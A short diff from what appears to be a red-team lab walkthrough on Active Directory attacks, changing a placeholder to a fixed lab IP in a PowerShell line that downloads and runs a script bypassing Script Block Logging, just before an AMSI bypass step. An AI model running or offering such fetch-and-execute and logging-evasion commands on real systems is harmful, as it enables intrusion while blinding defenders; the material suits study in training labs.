@@ -174,7 +174,7 @@ Launch sharpound on the student vm and export it to kali to use bloodhound
 *Identify a machine in the target domain where a Domain Admin session is available*
 First bypass the Enhanced Script Block Logging on the reverse shell
 ```powershell
-iex (iwr http://<IP>/sbloggingbypass.txt -UseBasicParsing)
+iex (iwr http://172.16.99.115/sbloggingbypass.txt -UseBasicParsing)
 ```
 To bypass the AMSI
 ```
